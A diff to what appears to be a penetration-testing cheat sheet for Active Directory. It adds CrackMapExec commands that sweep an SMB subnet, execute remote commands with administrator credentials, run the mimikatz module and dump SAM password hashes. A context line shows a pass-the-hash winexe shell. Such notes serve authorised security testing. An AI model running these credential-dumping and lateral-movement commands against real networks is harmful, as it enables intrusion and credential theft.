@@ -167,6 +167,18 @@ https://github.com/sense-of-security/ADRecon
 
 ## Compromise and Lateral Movement
 
+### Crackmapexec
+
+`crackmapexec smb 172.16.110.0/24`
+
+`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -x 'ipconfig'`
+
+`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --pass-pol`
+
+`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -M mimikatz`
+
+`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --sam`
+
 ### Winexe to boxes (not opsec safe) - service is run. No cleanup.
 
 `pth-winexe //10.0.0.1 -U DOMAINBLAH/blahuser%blahpassword cmd`
